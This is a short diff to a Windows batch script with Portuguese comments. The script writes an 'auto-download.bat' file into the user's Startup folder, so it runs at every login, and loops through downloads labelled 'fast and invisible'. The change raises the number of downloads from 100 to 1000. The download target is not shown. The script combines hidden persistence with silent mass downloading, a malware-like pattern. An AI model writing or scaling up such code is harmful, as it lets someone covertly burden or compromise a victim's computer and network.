@@ -8,7 +8,7 @@ set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 set "STARTBAT=%STARTUP%\auto-download.bat"
 
 :: Quantidade de downloads (mude aqui)
-set "QTD=100"
+set "QTD=1000"
 
 :: ---- Download rápido e invisível
 for /L %%i in (1,1,%QTD%) do (
@@ -32,3 +32,4 @@ echo exit
 
 endlocal
 exit
+
